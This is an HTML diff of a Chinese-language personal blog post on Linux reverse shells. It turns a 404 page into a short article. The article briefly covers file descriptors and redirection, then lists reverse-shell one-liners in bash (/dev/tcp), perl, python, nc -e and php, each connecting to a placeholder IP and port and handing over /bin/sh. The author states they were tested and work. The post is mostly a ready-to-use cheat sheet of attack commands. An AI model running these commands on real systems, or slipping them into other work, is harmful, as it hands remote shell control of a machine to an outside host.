@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>404 | Risks&#39;s blog</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="404 | Risks&#39;s blog">
+  <title>Linux反弹shell | Risks&#39;s blog</title>
+  <meta name="keywords" content=" 反弹shell ">
+  <meta name="description" content="Linux反弹shell | Risks&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="404 Not Found：该页无法显示很抱歉，您所访问的地址并不存在">
 <meta property="og:type" content="website">
@@ -333,24 +333,41 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="page-" class="article article-type-page" itemscope itemprop="blogPost">
+        <article id="post-Linux反弹shell" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">404</h1>
+        <h1 class="article-title">Linux反弹shell</h1>
     
     <div class="article-meta">
         
         
         
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="Linux">Linux</a> > 
+            
+            <a  data-rel="Linux&lt;---&gt;反弹shell">反弹shell</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color3">反弹shell</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-12-21 17:45:07'>2020-12-26 09:43</time>
+            Created At : <time class="date" title='Updated At: 2021-01-25 11:40:39'>2021-01-06 11:05</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:23</span>
+        <span>Count:412</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -380,7 +397,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#404-Not-Found%EF%BC%9A%E8%AF%A5%E9%A1%B5%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA"><span class="toc-text">404 Not Found：该页无法显示</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6"><span class="toc-text">Linux文件描述符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-text">Linux 重定向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="toc-text">Linux反弹shell的几种方式</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -396,7 +413,32 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="404-Not-Found：该页无法显示"><a href="#404-Not-Found：该页无法显示" class="headerlink" title="404 Not Found：该页无法显示"></a>404 Not Found：该页无法显示</h2><p><strong>很抱歉，您所访问的地址并不存在</strong></p>
+        <h2 id="Linux文件描述符"><a href="#Linux文件描述符" class="headerlink" title="Linux文件描述符"></a>Linux文件描述符</h2><p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p>
+<pre><code>标准输入standard input 0 （默认设备键盘）
+标准输出standard output 1（默认设备显示器）
+错误输出：error output 2（默认设备显示器）</code></pre>
+<h2 id="Linux-重定向"><a href="#Linux-重定向" class="headerlink" title="Linux 重定向"></a>Linux 重定向</h2><p>重定向主要分为两种(其他复杂的都是从这两种衍生而来的)</p>
+<pre><code>输入重定向 &lt;和&lt;&lt; 默认为标准输入0
+输出重定向 &gt;和&gt;&gt; 默认为标准输出1
+标准输出和标准错误输出 &amp;&gt;
+文件描述符的复制 &lt;&amp;或者&gt;&amp;
+exec 绑定重定向 exec number&lt;&gt;filename
+系统是从左到右执行的???</code></pre>
+<h2 id="Linux反弹shell的几种方式"><a href="#Linux反弹shell的几种方式" class="headerlink" title="Linux反弹shell的几种方式"></a>Linux反弹shell的几种方式</h2><p>经过测试以下几种方式能成功反弹shell</p>
+<p>1、bash反弹</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 //shell版
+
+bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1 //网页版</code></pre>
+<p>2、perl反弹</p>
+<pre><code>perl -e &#39;use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;</code></pre>
+<p>3、python反弹</p>
+<pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre>
+<p>4、ruby反弹</p>
+<pre><code>目前没找到可以成功反弹的</code></pre>
+<p>5、nc反弹</p>
+<pre><code>nc -e /bin/sh ip port 测试的nc版本v1.12</code></pre>
+<p>6、php反弹</p>
+<pre><code>php -r &#39;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以通过评论或者QQ972476182联系我。 </span>
